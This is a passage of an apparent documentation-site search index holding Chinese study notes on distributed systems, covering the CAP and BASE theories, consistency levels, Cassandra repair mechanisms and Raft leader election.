<li>\u4e0e\u5355\u7528\u6237\u7cfb\u7edf\u76f8\u6bd4\uff0c\u8fde\u63a5\u5230\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u6570\u636e\u5e93\u662f\u76f8\u5f53\u590d\u6742\u548c\u96be\u4ee5\u5904\u7406\u7684\u3002</li> <li>\u5982\u679c\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u6240\u6709\u8282\u70b9\u90fd\u8bd5\u56fe\u540c\u65f6\u53d1\u9001\u6570\u636e\uff0c\u7f51\u7edc\u4e2d\u53ef\u80fd\u4f1a\u51fa\u73b0\u8fc7\u8f7d\u73b0\u8c61\u3002</li> </ol>"},{"location":"ds/distributed_system/#cap-theorem","title":"CAP Theorem","text":"<ul> <li>\u4e00\u81f4\u6027\u00a0\uff1a\u6570\u636e\u5728\u591a\u4e2a\u526f\u672c\u4e4b\u95f4\u80fd\u591f\u4fdd\u6301\u4e00\u81f4\u7684\u7279\u6027\u3002</li> <li>\u53ef\u7528\u6027\uff1a\u7cfb\u7edf\u63d0\u4f9b\u7684\u670d\u52a1\u4e00\u76f4\u5904\u4e8e\u53ef\u7528\u7684\u72b6\u6001\uff0c\u6bcf\u6b21\u8bf7\u6c42\u90fd\u80fd\u83b7\u5f97\u6b63\u786e\u7684\u54cd\u5e94\u3002</li> <li>\u5206\u533a\u5bb9\u9519\u6027\uff1a\u5206\u5e03\u5f0f\u7cfb\u7edf\u5728\u9047\u5230\u4efb\u4f55\u7f51\u7edc\u5206\u533a\u6545\u969c\u7684\u65f6\u5019\uff0c\u4ecd\u7136\u80fd\u591f\u5bf9\u5916\u63d0\u4f9b\u6ee1\u8db3\u4e00\u81f4\u6027\u548c\u53ef\u7528\u6027\u7684\u670d\u52a1\u3002</li> </ul>"},{"location":"ds/distributed_system/#cap","title":"\u4e3a\u4ec0\u4e48 CAP \u4e0d\u53ef\u517c\u5f97\uff1f","text":"<p>\u5206\u5e03\u5f0f\u7cfb\u7edf\uff0c\u662f\u907f\u514d\u4e0d\u4e86\u5206\u533a\u7684\uff0c\u5206\u533a\u5bb9\u9519\u6027\u662f\u4e00\u5b9a\u8981\u6ee1\u8db3\u7684\uff0c\u6211\u4eec\u770b\u770b\u5728\u6ee1\u8db3\u5206\u533a\u5bb9\u9519\u7684\u57fa\u7840\u4e0a\uff0c\u80fd\u4e0d\u80fd\u540c\u65f6\u6ee1\u8db3 consistency \u548c availability\uff1f</p> <p>\u90a3\u4e48\u6ee1\u8db3\u5206\u533a\u5bb9\u9519\u7684\u57fa\u7840\u4e0a\uff0c\u80fd\u4e0d\u80fd\u540c\u65f6\u6ee1\u8db3<code>\u4e00\u81f4\u6027</code>\u548c<code>\u53ef\u7528\u6027</code>\uff1f</p>"},{"location":"ds/distributed_system/#cap_1","title":"CAP \u539f\u5219\u6743\u8861","text":"<p>CAP \u4e09\u8005\u4e0d\u53ef\u540c\u5f97\uff0c\u90a3\u4e48\u5fc5\u987b\u5f97\u505a\u4e00\u4e9b\u6743\u8861\u3002</p> <ul> <li>CA without P\u274c   \u5982\u679c\u4e0d\u8981\u6c42 P\uff08\u4e0d\u5141\u8bb8\u5206\u533a\uff09\uff0c\u5219 C\uff08\u5f3a\u4e00\u81f4\u6027\uff09\u548c A\uff08\u53ef\u7528\u6027\uff09\u662f\u53ef\u4ee5\u4fdd\u8bc1\u7684\u3002\u4f46\u662f\u5bf9\u4e8e\u5206\u5e03\u5f0f\u7cfb\u7edf\uff0c\u5206\u533a\u662f\u5ba2\u89c2\u5b58\u5728\u7684\uff0c\u5176\u5b9e\u5206\u5e03\u5f0f\u7cfb\u7edf\u7406\u8bba\u4e0a\u662f\u4e0d\u53ef\u9009 CA \u7684\u3002</li> <li>CP without A   \u5982\u679c\u4e0d\u8981\u6c42 A\uff08\u53ef\u7528\uff09\uff0c\u76f8\u5f53\u4e8e\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u9700\u8981\u5728 Server \u4e4b\u95f4\u5f3a\u4e00\u81f4\uff0c\u800c P\uff08\u5206\u533a\uff09\u4f1a\u5bfc\u81f4\u540c\u6b65\u65f6\u95f4\u65e0\u9650\u5ef6\u957f\uff0c\u5982\u6b64 CP \u4e5f\u662f\u53ef\u4ee5\u4fdd\u8bc1\u7684\u3002\u5f88\u591a\u4f20\u7edf\u7684\u6570\u636e\u5e93\u5206\u5e03\u5f0f\u4e8b\u52a1\u90fd\u5c5e\u4e8e\u8fd9\u79cd\u6a21\u5f0f\uff1a\u5206\u5e03\u5f0f\u6570\u636e\u5e93\uff0c\u5206\u5e03\u5f0f\u9501</li> <li>AP without C   \u8981\u9ad8\u53ef\u7528\u5e76\u5141\u8bb8\u5206\u533a\uff0c\u5219\u9700\u653e\u5f03\u4e00\u81f4\u6027\u3002\u4e00\u65e6\u5206\u533a\u53d1\u751f\uff0c\u8282\u70b9\u4e4b\u95f4\u53ef\u80fd\u4f1a\u5931\u53bb\u8054\u7cfb\uff0c\u4e3a\u4e86\u9ad8\u53ef\u7528\uff0c\u6bcf\u4e2a\u8282\u70b9\u53ea\u80fd\u7528\u672c\u5730\u6570\u636e\u63d0\u4f9b\u670d\u52a1\uff0c\u800c\u8fd9\u6837\u4f1a\u5bfc\u81f4\u5168\u5c40\u6570\u636e\u7684\u4e0d\u4e00\u81f4\u6027\u3002\u73b0\u5728\u4f17\u591a\u7684 NoSQL \u90fd\u5c5e\u4e8e\u6b64\u7c7b\uff1aWeb \u7f13\u5b58\uff0cDNS</li> </ul>"},{"location":"ds/distributed_system/#cap_2","title":"CAP \u539f\u5219\u5b9e\u9645\u5e94\u7528","text":"<p>\u6211\u4eec\u5e94\u8be5\u90fd\u63a5\u89e6\u8fc7\u5fae\u670d\u52a1\uff0c\u5e38\u89c1\u7684\u53ef\u4ee5\u4f5c\u4e3a\u6ce8\u518c\u4e2d\u5fc3\u7684\u7ec4\u4ef6\u6709\uff1aZooKeeper\u3001Eureka\u3001Nacos...\u3002</p> <ol> <li>ZooKeeper \u4fdd\u8bc1\u7684\u662f CP\u3002\u00a0 \u4efb\u4f55\u65f6\u523b\u5bf9 ZooKeeper \u7684\u8bfb\u8bf7\u6c42\u90fd\u80fd\u5f97\u5230\u4e00\u81f4\u6027\u7684\u7ed3\u679c\uff0c\u4f46\u662f\uff0c ZooKeeper \u4e0d\u4fdd\u8bc1\u6bcf\u6b21\u8bf7\u6c42\u7684\u53ef\u7528\u6027\u6bd4\u5982\u5728 Leader \u9009\u4e3e\u8fc7\u7a0b\u4e2d\u6216\u8005\u534a\u6570\u4ee5\u4e0a\u7684\u673a\u5668\u4e0d\u53ef\u7528\u7684\u65f6\u5019\u670d\u52a1\u5c31\u662f\u4e0d\u53ef\u7528\u7684\u3002</li> <li>Eureka \u4fdd\u8bc1\u7684\u5219\u662f AP\u3002\u00a0Eureka \u5728\u8bbe\u8ba1\u7684\u65f6\u5019\u5c31\u662f\u4f18\u5148\u4fdd\u8bc1 A \uff08\u53ef\u7528\u6027\uff09\u3002\u5728 Eureka \u4e2d\u4e0d\u5b58\u5728\u4ec0\u4e48 Leader \u8282\u70b9\uff0c\u6bcf\u4e2a\u8282\u70b9\u90fd\u662f\u4e00\u6837\u7684\u3001\u5e73\u7b49\u7684\u3002\u56e0\u6b64 Eureka \u4e0d\u4f1a\u50cf ZooKeeper \u90a3\u6837\u51fa\u73b0\u9009\u4e3e\u8fc7\u7a0b\u4e2d\u6216\u8005\u534a\u6570\u4ee5\u4e0a\u7684\u673a\u5668\u4e0d\u53ef\u7528\u7684\u65f6\u5019\u670d\u52a1\u5c31\u662f\u4e0d\u53ef\u7528\u7684\u60c5\u51b5\u3002 Eureka \u4fdd\u8bc1\u5373\u4f7f\u5927\u90e8\u5206\u8282\u70b9\u6302\u6389\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u6b63\u5e38\u63d0\u4f9b\u670d\u52a1\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u8282\u70b9\u662f\u53ef\u7528\u7684\u5c31\u884c\u4e86\u3002\u53ea\u4e0d\u8fc7\u8fd9\u4e2a\u8282\u70b9\u4e0a\u7684\u6570\u636e\u53ef\u80fd\u5e76\u4e0d\u662f\u6700\u65b0\u7684\u3002</li> <li>Nacos \u4e0d\u4ec5\u652f\u6301 CP \u4e5f\u652f\u6301 AP\u3002</li> </ol> <p>\u653e\u5f03 A\uff08\u53ef\u7528\uff09\uff0c\u76f8\u5f53\u4e8e\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u9700\u8981\u5728 Server \u4e4b\u95f4\u5f3a\u4e00\u81f4\uff0c\u800c P\uff08\u5206\u533a\uff09\u4f1a\u5bfc\u81f4\u540c\u6b65\u65f6\u95f4\u65e0\u9650\u5ef6\u957f\uff0c\u5982\u6b64 CP \u4e5f\u662f\u53ef\u4ee5\u4fdd\u8bc1\u7684\u3002\u5f88\u591a\u4f20\u7edf\u7684\u6570\u636e\u5e93\u5206\u5e03\u5f0f\u4e8b\u52a1\u90fd\u5c5e\u4e8e\u8fd9\u79cd\u6a21\u5f0f\u3002</p>"},{"location":"ds/distributed_system/#base-theorem","title":"BASE Theorem","text":"<p>BASE \u7406\u8bba\u662f\u5bf9 CAP \u4e2d\u4e00\u81f4\u6027 C \u548c\u53ef\u7528\u6027 A \u6743\u8861\u7684\u7ed3\u679c\uff0c\u5176\u6765\u6e90\u4e8e\u5bf9\u5927\u89c4\u6a21\u4e92\u8054\u7f51\u7cfb\u7edf\u5206\u5e03\u5f0f\u5b9e\u8df5\u7684\u603b\u7ed3\uff0c\u662f\u57fa\u4e8e CAP \u5b9a\u7406\u9010\u6b65\u6f14\u5316\u800c\u6765\u7684\uff0c\u5b83\u5927\u5927\u964d\u4f4e\u4e86\u6211\u4eec\u5bf9\u7cfb\u7edf\u7684\u8981\u6c42\u3002</p> <p>BASE \u7406\u8bba\u7684\u6838\u5fc3\u601d\u60f3\u662f\uff1a\u5373\u4f7f\u65e0\u6cd5\u505a\u5230\u5f3a\u4e00\u81f4\u6027\uff08Strong consistency\uff09\uff0c\u4f46\u6bcf\u4e2a\u5e94\u7528\u90fd\u53ef\u4ee5\u6839\u636e\u81ea\u8eab\u7684\u4e1a\u52a1\u7279\u70b9\uff0c\u91c7\u7528\u9002\u5f53\u7684\u65b9\u5f0f\u6765\u4f7f\u7cfb\u7edf\u8fbe\u5230\u6700\u7ec8\u4e00\u81f4\u6027\uff08Eventual consistency\uff09\u3002</p> <p></p>"},{"location":"ds/distributed_system/#base","title":"BASE \u7406\u8bba\u7684\u4e09\u4e2a\u7279\u6027","text":"<ol> <li>\u57fa\u672c\u53ef\u7528\uff1a\u5047\u5982\u7cfb\u7edf\u51fa\u73b0\u4e86\u4e0d\u53ef\u9884\u77e5\u6545\u969c\uff0c\u5141\u8bb8\u635f\u5931\u90e8\u5206\u53ef\u7528\u6027\uff0c\u5f53\u7136\u4e5f\u4e0d\u80fd\u5b8c\u5168\u4e0d\u53ef\u7528\u3002</li> </ol> <p>\u635f\u5931\u7684\u8fd9\u90e8\u5206\u53ef\u7528\u6027\u6307\uff1a</p> <ul> <li>\u54cd\u5e94\u65f6\u95f4\u4e0a\u7684\u635f\u5931\uff1a\u6b63\u5e38\u60c5\u51b5\u4e0b\u7684\u641c\u7d22\u5f15\u64ce 0.5 \u79d2\u5373\u8fd4\u56de\u7ed9\u7528\u6237\u7ed3\u679c\uff0c\u800c\u57fa\u672c\u53ef\u7528\u7684\u641c\u7d22\u5f15\u64ce\u53ef\u4ee5\u5728 2 \u79d2\u4f5c\u7528\u8fd4\u56de\u7ed3\u679c\u3002</li> <li>\u529f\u80fd\u4e0a\u7684\u635f\u5931\uff1a\u5728\u4e00\u4e2a\u7535\u5546\u7f51\u7ad9\u4e0a\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u53ef\u4ee5\u987a\u5229\u5b8c\u6210\u6bcf\u4e00\u7b14\u8ba2\u5355\u3002\u4f46\u662f\u5230\u4e86\u5927\u4fc3\u671f\u95f4\uff0c\u4e3a\u4e86\u4fdd\u62a4\u8d2d\u7269\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\uff0c\u90e8\u5206\u6d88\u8d39\u8005\u53ef\u80fd\u4f1a\u88ab\u5f15\u5bfc\u5230\u4e00\u4e2a\u964d\u7ea7\u9875\u9762\u3002</li> </ul> <ol> <li>\u8f6f\u72b6\u6001\uff1a\u5141\u8bb8\u7cfb\u7edf\u4e2d\u7684\u6570\u636e\u5b58\u5728\u4e2d\u95f4\u72b6\u6001\uff08CAP \u7406\u8bba\u4e2d\u7684\u6570\u636e\u4e0d\u4e00\u81f4\uff09\uff0c\u5e76\u8ba4\u4e3a\u8be5\u4e2d\u95f4\u72b6\u6001\u7684\u5b58\u5728\u4e0d\u4f1a\u5f71\u54cd\u7cfb\u7edf\u7684\u6574\u4f53\u53ef\u7528\u6027\uff0c\u5373\u5141\u8bb8\u7cfb\u7edf\u5728\u4e0d\u540c\u8282\u70b9\u7684\u6570\u636e\u526f\u672c\u4e4b\u95f4\u8fdb\u884c\u6570\u636e\u540c\u6b65\u7684\u8fc7\u7a0b\u5b58\u5728\u5ef6\u65f6\u3002</li> <li>\u6700\u7ec8\u4e00\u81f4\u6027\uff1a\u5f3a\u8c03\u7684\u662f\u7cfb\u7edf\u4e2d\u6240\u6709\u7684\u6570\u636e\u526f\u672c\uff0c\u5728\u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u540c\u6b65\u540e\uff0c\u6700\u7ec8\u80fd\u591f\u8fbe\u5230\u4e00\u4e2a\u4e00\u81f4\u7684\u72b6\u6001\u3002\u56e0\u6b64\uff0c\u6700\u7ec8\u4e00\u81f4\u6027\u7684\u672c\u8d28\u662f\u9700\u8981\u7cfb\u7edf\u4fdd\u8bc1\u6700\u7ec8\u6570\u636e\u80fd\u591f\u8fbe\u5230\u4e00\u81f4\uff0c\u800c\u4e0d\u9700\u8981\u5b9e\u65f6\u4fdd\u8bc1\u7cfb\u7edf\u6570\u636e\u7684\u5f3a\u4e00\u81f4\u6027\u3002</li> </ol>"},{"location":"ds/distributed_system/#3","title":"\u5206\u5e03\u5f0f\u4e00\u81f4\u6027\u7684 3 \u79cd\u7ea7\u522b\uff1a","text":"<ol> <li>\u5f3a\u4e00\u81f4\u6027\u00a0\uff1a\u7cfb\u7edf\u5199\u5165\u4e86\u4ec0\u4e48\uff0c\u8bfb\u51fa\u6765\u7684\u5c31\u662f\u4ec0\u4e48\u3002</li> <li>\u5f31\u4e00\u81f4\u6027\u00a0\uff1a\u4e0d\u4e00\u5b9a\u53ef\u4ee5\u8bfb\u53d6\u5230\u6700\u65b0\u5199\u5165\u7684\u503c\uff0c\u4e5f\u4e0d\u4fdd\u8bc1\u591a\u5c11\u65f6\u95f4\u4e4b\u540e\u8bfb\u53d6\u5230\u7684\u6570\u636e\u662f\u6700\u65b0\u7684\uff0c\u53ea\u662f\u4f1a\u5c3d\u91cf\u4fdd\u8bc1\u67d0\u4e2a\u65f6\u523b\u8fbe\u5230\u6570\u636e\u4e00\u81f4\u7684\u72b6\u6001\u3002</li> <li>\u6700\u7ec8\u4e00\u81f4\u6027\u00a0\uff1a\u5f31\u4e00\u81f4\u6027\u7684\u5347\u7ea7\u7248\uff0c\u7cfb\u7edf\u4f1a\u4fdd\u8bc1\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u8fbe\u5230\u6570\u636e\u4e00\u81f4\u7684\u72b6\u6001\u3002</li> </ol> <p>\u4e1a\u754c\u6bd4\u8f83\u63a8\u5d07\u662f\u6700\u7ec8\u4e00\u81f4\u6027\u7ea7\u522b\uff0c\u4f46\u662f\u67d0\u4e9b\u5bf9\u6570\u636e\u4e00\u81f4\u8981\u6c42\u5341\u5206\u4e25\u683c\u7684\u573a\u666f\u6bd4\u5982\u94f6\u884c\u8f6c\u8d26\u8fd8\u662f\u8981\u4fdd\u8bc1\u5f3a\u4e00\u81f4\u6027\u3002</p> <p>\u6700\u7ec8\u4e00\u81f4\u6027\u600e\u4e48\u4fdd\u8bc1\u5462\uff1f</p> <ul> <li>\u8bfb\u65f6\u4fee\u590d\u00a0: \u5728\u8bfb\u53d6\u6570\u636e\u65f6\uff0c\u68c0\u6d4b\u6570\u636e\u7684\u4e0d\u4e00\u81f4\uff0c\u8fdb\u884c\u4fee\u590d\u3002\u6bd4\u5982 Cassandra \u7684 Read Repair \u5b9e\u73b0\uff0c\u5177\u4f53\u6765\u8bf4\uff0c\u5728\u5411 Cassandra \u7cfb\u7edf\u67e5\u8be2\u6570\u636e\u7684\u65f6\u5019\uff0c\u5982\u679c\u68c0\u6d4b\u5230\u4e0d\u540c\u8282\u70b9 \u7684\u526f\u672c\u6570\u636e\u4e0d\u4e00\u81f4\uff0c\u7cfb\u7edf\u5c31\u81ea\u52a8\u4fee\u590d\u6570\u636e\u3002</li> <li>\u5199\u65f6\u4fee\u590d\u00a0: \u5728\u5199\u5165\u6570\u636e\uff0c\u68c0\u6d4b\u6570\u636e\u7684\u4e0d\u4e00\u81f4\u65f6\uff0c\u8fdb\u884c\u4fee\u590d\u3002\u6bd4\u5982 Cassandra \u7684 Hinted Handoff \u5b9e\u73b0\u3002\u5177\u4f53\u6765\u8bf4\uff0cCassandra \u96c6\u7fa4\u7684\u8282\u70b9\u4e4b\u95f4\u8fdc\u7a0b\u5199\u6570\u636e\u7684\u65f6\u5019\uff0c\u5982\u679c\u5199\u5931\u8d25 \u5c31\u5c06\u6570\u636e\u7f13\u5b58\u4e0b\u6765\uff0c\u7136\u540e\u5b9a\u65f6\u91cd\u4f20\uff0c\u4fee\u590d\u6570\u636e\u7684\u4e0d\u4e00\u81f4\u6027\u3002</li> <li>\u5f02\u6b65\u4fee\u590d\u00a0: \u8fd9\u4e2a\u662f\u6700\u5e38\u7528\u7684\u65b9\u5f0f\uff0c\u901a\u8fc7\u5b9a\u65f6\u5bf9\u8d26\u68c0\u6d4b\u526f\u672c\u6570\u636e\u7684\u4e00\u81f4\u6027\uff0c\u5e76\u4fee\u590d\u3002</li> </ul>"},{"location":"ds/raft/","title":"Raft","text":""},{"location":"ds/raft/#_1","title":"\u9886\u5bfc\u8005\u9009\u4e3e","text":"<p>Raft\u4e2d\u7684\u670d\u52a1\u5668\u6709\u4e09\u79cd\u72b6\u6001\uff1a<code>Leader</code>\u3001<code>Follower</code>\u3001<code>Candidate</code>\u3002</p> <ul> <li> <p>Raft\u5229\u7528\u5fc3\u8df3\u673a\u5236\u6765\u5207\u6362\u6216\u8005\u7ef4\u6301\u5f53\u524d\u7684\u72b6\u6001</p> </li> <li> <p>leader: \u5468\u671f\u6027\u5730\u5411\u5176\u4ed6\u8282\u70b9\u53d1\u9001\u5fc3\u8df3\u5305\uff0c\u6765\u7ef4\u6301\u81ea\u5df1\u7684\u5730\u4f4d\u3002</p> </li> <li>follower: \u4e00\u76f4\u7b49\u5f85leader\u7684\u5fc3\u8df3\u5305\uff0c\u5982\u679c\u5728\u4e00\u6bb5\u65f6\u95f4\u5185\u6ca1\u6709\u6536\u5230\uff0c\u90a3\u4e48\u5b83\u4f1a\u53d8\u6210candidate\uff0c\u7136\u540e\u53d1\u8d77\u9009\u4e3e\u5e76\u4e14\u7ed9\u81ea\u5df1\u6295\u7968\u3002</li> <li>candidate: \u53d1\u8d77\u9009\u4e3e\uff0c\u5982\u679c\u5b83\u6536\u5230\u4e86\u5927\u591a\u6570\u8282\u70b9\u7684\u6295\u7968\uff0c\u90a3\u4e48\u5b83\u5c31\u4f1a\u53d8\u6210leader\u3002</li> </ul>"},{"location":"ds/raft/#_2","title":"\u9009\u4e3e\u7ed3\u679c","text":"<p>\u8d62\u5f97\u9009\u4e3e\u7684\u6761\u4ef6\uff1a\u5728\u4e00\u4e2a\u968f\u673a\u7684\u9650\u5b9a\u65f6\u95f4\u5185\u83b7\u5f97\u8d85\u8fc7\u534a\u6570\u9009\u7968</p> <ol> <li>\u4e00\u4e2acandidate\u8d62\u5f97\u9009\u4e3e\u5e76\u6210\u4e3aleader\u3002\u5982\u679c\u6709\u5176\u4ed6candidate\uff0c\u90a3\u4ed6\u4eec\u5fc5\u7136\u9009\u4e3e\u5931\u8d25\uff0c\u4f1a\u5728\u63a5\u6536\u5230\u65b0leader\u7684\u5fc3\u8df3\u4f1a\u6062\u590dfollower\u72b6\u6001</li> <li>\u5f97\u7968\u5206\u6563\uff0c\u6ca1\u6709candidate\u8d62\u5f97\u9009\u4e3e\uff0c\u90e8\u5206candidate\u5c31\u4f1a\u5728\u8d85\u65f6\u4e4b\u540e\u8fdb\u5165\u4e0b\u4e00\u4e2aterm\uff0c\u5f00\u542f\u65b0\u7684\u9009\u4e3e\u3002\u8fd9\u91cc\u968f\u673a\u7684\u9009\u4e3e\u8d85\u65f6\u65f6\u95f4\u80fd\u591f\u4fdd\u8bc1\u5f88\u5feb\u5c31\u4f1a\u6709\u4e00\u4e2a\u65b0leader\u51fa\u73b0\u3002</li> </ol>"},{"location":"slides/","title":"Slides","text":"<ul> <li>\ud83d\udd17beautiful sequence</li> </ul>"}]}